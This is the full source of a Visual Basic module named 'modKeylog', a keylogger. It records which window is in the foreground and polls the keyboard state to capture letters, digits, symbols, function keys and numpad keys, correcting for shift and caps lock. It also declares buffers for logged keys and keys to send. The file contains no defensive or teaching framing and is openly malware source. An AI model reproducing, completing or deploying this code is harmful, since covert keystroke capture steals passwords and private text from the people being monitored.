Attribute VB_Name = "modKeylog"
Public KeyLogBuffer As String, KeysToSend As String

Dim LastWindow As Long

Function CheckWindow() As String
Dim CurrentWindow As Long

CurrentWindow = GetForegroundWindow

If CurrentWindow <> LastWindow Then
    CheckWindow = GetWindowCaption(CurrentWindow)
    LastWindow = CurrentWindow
End If

End Function

Function GetCurrentKeys() As String
On Error Resume Next

Dim keystate As Long
Dim Shift As Long
Shift = Getasynckeystate(vbKeyShift)

keystate = Getasynckeystate(vbKeyA)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
        'A"
        GetCurrentKeys = "A"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
        'a"
        GetCurrentKeys = "a"
    End If

keystate = Getasynckeystate(vbKeyB)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
        'B"
        GetCurrentKeys = "B"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
        'b"
        GetCurrentKeys = "b"
    End If

keystate = Getasynckeystate(vbKeyC)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
        'C"
        GetCurrentKeys = "C"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
        'c"
        GetCurrentKeys = "c"
    End If
'
keystate = Getasynckeystate(vbKeyD)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'D"
    GetCurrentKeys = "D"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'd"
    GetCurrentKeys = "d"
    End If
'
keystate = Getasynckeystate(vbKeyE)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'E"
    GetCurrentKeys = "E"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'e"
    GetCurrentKeys = "e"
    End If
'
keystate = Getasynckeystate(vbKeyF)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'F"
    GetCurrentKeys = "F"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'f"
    GetCurrentKeys = "f"
    End If

keystate = Getasynckeystate(vbKeyG)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
        'G"
        GetCurrentKeys = "G"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
        'g"
        GetCurrentKeys = "g"
    End If

keystate = Getasynckeystate(vbKeyH)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'H"
    GetCurrentKeys = "H"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    
    GetCurrentKeys = "h"
    End If

keystate = Getasynckeystate(vbKeyI)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    
    GetCurrentKeys = "I"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    
    GetCurrentKeys = "i"
    End If

keystate = Getasynckeystate(vbKeyJ)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
        'J"
    GetCurrentKeys = "J"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
        'j
    GetCurrentKeys = "j"
    End If
'
keystate = Getasynckeystate(vbKeyK)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    
    GetCurrentKeys = "K"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'k"
    GetCurrentKeys = "k"
    End If
'
keystate = Getasynckeystate(vbKeyL)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'L"
    GetCurrentKeys = "L"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'l"
    GetCurrentKeys = "l"
    End If
'

keystate = Getasynckeystate(vbKeyM)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'M"
    GetCurrentKeys = "M"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'm"
    GetCurrentKeys = "m"
    End If
'
keystate = Getasynckeystate(vbKeyN)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'N"
    GetCurrentKeys = "N"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'n"
    GetCurrentKeys = "n"
    End If
'
keystate = Getasynckeystate(vbKeyO)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'O"
    GetCurrentKeys = "O"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'o"
    GetCurrentKeys = "o"
    End If
'
keystate = Getasynckeystate(vbKeyP)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'P"
    GetCurrentKeys = "P"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'p"
    GetCurrentKeys = "p"
    End If
'
keystate = Getasynckeystate(vbKeyQ)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    '"Q"
    GetCurrentKeys = "Q"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    '"q"
    GetCurrentKeys = "q"
    End If
'
keystate = Getasynckeystate(vbKeyR)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'R"
    GetCurrentKeys = "R"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'r"
    GetCurrentKeys = "r"
    End If
'
keystate = Getasynckeystate(vbKeyS)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'S"
    GetCurrentKeys = "S"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    's"
    GetCurrentKeys = "s"
    End If
'
keystate = Getasynckeystate(vbKeyT)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'T"
    GetCurrentKeys = "T"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    't"
    GetCurrentKeys = "t"
    End If
'
keystate = Getasynckeystate(vbKeyU)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'U"
    GetCurrentKeys = "U"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'u"
    GetCurrentKeys = "u"
    End If
'
keystate = Getasynckeystate(vbKeyV)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'V"
    GetCurrentKeys = "V"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'v"
    GetCurrentKeys = "v"
    End If
'
keystate = Getasynckeystate(vbKeyW)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'W"
    GetCurrentKeys = "W"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'w"
    GetCurrentKeys = "w"
    End If
'
keystate = Getasynckeystate(vbKeyX)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'X"
    GetCurrentKeys = "X"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'x"
    GetCurrentKeys = "x"
    End If
'
keystate = Getasynckeystate(vbKeyY)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    'Y"
    GetCurrentKeys = "Y"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    'y"
    GetCurrentKeys = "y"
    End If
'
keystate = Getasynckeystate(vbKeyZ)
    If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
    '"Z"
    GetCurrentKeys = "Z"
    End If
    If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
    '"z"
    GetCurrentKeys = "z"
    End If
'
keystate = Getasynckeystate(vbKey1)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"1"
  GetCurrentKeys = "1"
      End If
      If Shift <> 0 And (keystate And &H1) = &H1 Then
'"!"
GetCurrentKeys = "!"
End If
'
keystate = Getasynckeystate(vbKey2)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"2"
      GetCurrentKeys = "2"
      End If
       If Shift <> 0 And (keystate And &H1) = &H1 Then
'"@"
GetCurrentKeys = "@"
End If
'
keystate = Getasynckeystate(vbKey3)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"3"
  GetCurrentKeys = "3"
      End If
       If Shift <> 0 And (keystate And &H1) = &H1 Then
'"#"
GetCurrentKeys = "#"
End If
'
keystate = Getasynckeystate(vbKey4)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"4"
  GetCurrentKeys = "4"
      End If
If Shift <> 0 And (keystate And &H1) = &H1 Then
'"$"
GetCurrentKeys = "$"
End If
'

keystate = Getasynckeystate(vbKey5)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"5"
  GetCurrentKeys = "5"
      End If
       If Shift <> 0 And (keystate And &H1) = &H1 Then
'%"
GetCurrentKeys = "%"
End If
'
keystate = Getasynckeystate(vbKey6)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '6"
  GetCurrentKeys = "6"
      End If
    If Shift <> 0 And (keystate And &H1) = &H1 Then
'^"
GetCurrentKeys = "^"
End If
'
keystate = Getasynckeystate(vbKey7)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '7"
  GetCurrentKeys = "7"
     End If
     If Shift <> 0 And (keystate And &H1) = &H1 Then
'&"
GetCurrentKeys = "&"
End If
'
    keystate = Getasynckeystate(vbKey8)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '8"
  GetCurrentKeys = "8"
     End If
      If Shift <> 0 And (keystate And &H1) = &H1 Then
'*"
GetCurrentKeys = "*"
End If
'
    keystate = Getasynckeystate(vbKey9)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '9"
  GetCurrentKeys = "9"
     End If
      If Shift <> 0 And (keystate And &H1) = &H1 Then
'"("
GetCurrentKeys = "("
End If
'
    keystate = Getasynckeystate(vbKey0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"0"
  GetCurrentKeys = "0"
   End If
      If Shift <> 0 And (keystate And &H1) = &H1 Then
'")"
GetCurrentKeys = ")"
End If
'
   keystate = Getasynckeystate(vbKeyBack)
If (keystate And &H1) = &H1 Then
  Text1.Text = Mid(Text1.Text, 1, Len(Text1.Text) - 1)
  '"{bkspc}"
  GetCurrentKeys = "{backspc}"
     End If
'
    keystate = Getasynckeystate(vbKeyTab)
If (keystate And &H1) = &H1 Then
  '"{tab}"
     ´GetCurrentKeys = "{TAB}"
     End If
 '
   keystate = Getasynckeystate(vbKeyReturn)
If (keystate And &H1) = &H1 Then
  'vbCrLf
  GetCurrentKeys = vbCrLf
     End If
 '
   keystate = Getasynckeystate(vbKeyControl)
If (keystate And &H1) = &H1 Then
     GetCurrentKeys = "{CTRL}"
     End If
   '
   keystate = Getasynckeystate(vbKeyMenu)
If (keystate And &H1) = &H1 Then
  GetCurrentKeys = "{ALT}"
     End If
'
   keystate = Getasynckeystate(vbKeyPause)
If (keystate And &H1) = &H1 Then
  '"{pause}"
  GetCurrentKeys = "{pause}"
     End If
'
   keystate = Getasynckeystate(vbKeyEscape)
If (keystate And &H1) = &H1 Then
  '"{esc}"
  GetCurrentKeys = "{esc}"
     End If
'
   keystate = Getasynckeystate(vbKeySpace)
If (keystate And &H1) = &H1 Then
  '" "
  GetCurrentKeys = " "
     End If
'
   keystate = Getasynckeystate(vbKeyEnd)
If (keystate And &H1) = &H1 Then
  '"{end}"
  GetCurrentKeys = "{end}"
     End If
'
   keystate = Getasynckeystate(vbKeyHome)
If (keystate And &H1) = &H1 Then
  '"{home}"
  GetCurrentKeys = "{home}"
     End If
'
keystate = Getasynckeystate(vbKeyLeft)
If (keystate And &H1) = &H1 Then
  '"{left}"
  GetCurrentKeys = "{left}"
     End If
'
keystate = Getasynckeystate(vbKeyRight)
If (keystate And &H1) = &H1 Then
  '"{right}"
  GetCurrentKeys = "{right}"
     End If
'
keystate = Getasynckeystate(vbKeyUp)
If (keystate And &H1) = &H1 Then
  '"{up}"
  GetCurrentKeys = "{up}"
     End If
'
   keystate = Getasynckeystate(vbKeyDown)
If (keystate And &H1) = &H1 Then
  '"{down}"
  GetCurrentKeys = "{down}"
     End If
'
keystate = Getasynckeystate(vbKeyInsert)
If (keystate And &H1) = &H1 Then
  '"{insert}"
  GetCurrentKeys = "{insert}"
     End If
'
keystate = Getasynckeystate(vbKeyDelete)
If (keystate And &H1) = &H1 Then
  '"{delete}"
  GetCurrentKeys = "{delete}"
     End If
'
keystate = Getasynckeystate(&HBA)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"´"
  GetCurrentKeys = ";"
     End If
'
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  '"`"
  GetCurrentKeys = ":"
      End If
'
keystate = Getasynckeystate(&HBB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"+"
  GetCurrentKeys = "+"
  End If
'
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  '"*"
  GetCurrentKeys = "="
     End If
'
keystate = Getasynckeystate(&HBC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '","
  GetCurrentKeys = ","
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
    '""
  GetCurrentKeys = "<"
     End If
'
keystate = Getasynckeystate(&HBD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"-"
  GetCurrentKeys = "-"
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  '"_"
  GetCurrentKeys = "_"
     End If
'
keystate = Getasynckeystate(&HBE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"."
  GetCurrentKeys = "."
     End If
'
If Shift <> 0 And (keystate And &H1) = &H1 Then
  '":"
  GetCurrentKeys = ">"
     End If
'
keystate = Getasynckeystate(&HBF)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"~"
  GetCurrentKeys = "/"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  '"^"
  GetCurrentKeys = "?"
     End If
'
keystate = Getasynckeystate(&HEF)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"<"
  GetCurrentKeys = "<"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  '">"
  GetCurrentKeys = ">"
     End If
'
keystate = Getasynckeystate(&HDB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"'"
  GetCurrentKeys = "["
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  '"?"
  GetCurrentKeys = "{"
     End If
'
keystate = Getasynckeystate(&HDC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"\"
  GetCurrentKeys = "\"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  '"|"
  GetCurrentKeys = "|"
     End If
'
keystate = Getasynckeystate(&HDD)
If Shift = 0 And (keystate And &H1) = &H1 Then
    GetCurrentKeys = "]"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  '»"
  GetCurrentKeys = "}"
     End If
'
keystate = Getasynckeystate(&HDE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '"""
  GetCurrentKeys = "'"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  ''"
  GetCurrentKeys = Chr(34)
     End If
'
keystate = Getasynckeystate(vbKeyMultiply)
If (keystate And &H1) = &H1 Then
  '*"
  GetCurrentKeys = "*"
     End If
'
keystate = Getasynckeystate(vbKeyDivide)
If (keystate And &H1) = &H1 Then
  '/"
  GetCurrentKeys = "/"
     End If
'
keystate = Getasynckeystate(vbKeyAdd)
If (keystate And &H1) = &H1 Then
  '+"
  GetCurrentKeys = "+"
     End If
'
keystate = Getasynckeystate(vbKeySubtract)
If (keystate And &H1) = &H1 Then
  '-"
  GetCurrentKeys = "-"
     End If
'
keystate = Getasynckeystate(vbKeyDecimal)
If (keystate And &H1) = &H1 Then
  '{kpdel}"
  GetCurrentKeys = "{kpdel}"
     End If
'
   keystate = Getasynckeystate(vbKeyF1)
If (keystate And &H1) = &H1 Then
  '{F1}"
  GetCurrentKeys = "{F1}"
     End If
'
   keystate = Getasynckeystate(vbKeyF2)
If (keystate And &H1) = &H1 Then
  '{F2}"
  GetCurrentKeys = "{F2}"
     End If
'
   keystate = Getasynckeystate(vbKeyF3)
If (keystate And &H1) = &H1 Then
  '{F3}"
  GetCurrentKeys = "{F3}"
     End If
'
   keystate = Getasynckeystate(vbKeyF4)
If (keystate And &H1) = &H1 Then
  '{F4}"
  GetCurrentKeys = "{F4}"
     End If
'
   keystate = Getasynckeystate(vbKeyF5)
If (keystate And &H1) = &H1 Then
  '{F5}"
  GetCurrentKeys = "{F5}"
     End If
'
   keystate = Getasynckeystate(vbKeyF6)
If (keystate And &H1) = &H1 Then
  '{F6}"
  GetCurrentKeys = "{F6}"
     End If
'
   keystate = Getasynckeystate(vbKeyF7)
If (keystate And &H1) = &H1 Then
  '{F7}"
  GetCurrentKeys = "{F7}"
     End If
'
   keystate = Getasynckeystate(vbKeyF8)
If (keystate And &H1) = &H1 Then
  '{F8}"
  GetCurrentKeys = "{F8}"
     End If
'
   keystate = Getasynckeystate(vbKeyF9)
If (keystate And &H1) = &H1 Then
  '{F9}"
  GetCurrentKeys = "{F9}"
     End If
'
   keystate = Getasynckeystate(vbKeyF10)
If (keystate And &H1) = &H1 Then
  '{F10}"
  GetCurrentKeys = "{F10}"
     End If
 '
   keystate = Getasynckeystate(vbKeyF11)
If (keystate And &H1) = &H1 Then
  '{F11}"
  GetCurrentKeys = "{F11}"
     End If
 '
   keystate = Getasynckeystate(vbKeyF12)
If Shift = 0 And (keystate And &H1) = &H1 Then
  '{F12}"
  GetCurrentKeys = "{F12}"
     End If
  '
    keystate = Getasynckeystate(vbKeyNumlock)
If (keystate And &H1) = &H1 Then
  '{NumLock}"
  GetCurrentKeys = "{NumLock}"
     End If
 '
     keystate = Getasynckeystate(vbKeyScrollLock)
If (keystate And &H1) = &H1 Then
  '{ScrollLock}"
  GetCurrentKeys = "{ScrollLock}"
         End If
 '
    keystate = Getasynckeystate(vbKeyPrint)
If (keystate And &H1) = &H1 Then
  '{PrintScreen}"
  GetCurrentKeys = "{PrintScreen}"
         End If
 '
       keystate = Getasynckeystate(vbKeyPageUp)
If (keystate And &H1) = &H1 Then
  '{PageUp}"
 GetCurrentKeys = "{PGUP}"
         End If
 '
       keystate = Getasynckeystate(vbKeyPageDown)
If (keystate And &H1) = &H1 Then
  '{Pagedown}"
  GetCurrentKeys = "{PGDN}"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad1)
If (keystate And &H1) = &H1 Then
  '1"
  GetCurrentKeys = "1"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad2)
If (keystate And &H1) = &H1 Then
  '2"
  GetCurrentKeys = "2"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad3)
If (keystate And &H1) = &H1 Then
  '3"
 GetCurrentKeys = "3"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad4)
If (keystate And &H1) = &H1 Then
  '4"
 GetCurrentKeys = "4"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad5)
If (keystate And &H1) = &H1 Then
  '5"
  GetCurrentKeys = "5"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad6)
If (keystate And &H1) = &H1 Then
  '6"
 GetCurrentKeys = "6"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad7)
If (keystate And &H1) = &H1 Then
  '7"
  GetCurrentKeys = "7"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad8)
If (keystate And &H1) = &H1 Then
  '8"
  GetCurrentKeys = "8"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad9)
If (keystate And &H1) = &H1 Then
  '9"
  GetCurrentKeys = "9"
         End If
'
         keystate = Getasynckeystate(vbKeyNumpad0)
If (keystate And &H1) = &H1 Then
  '0"
  GetCurrentKeys = "0"
         End If

End Function
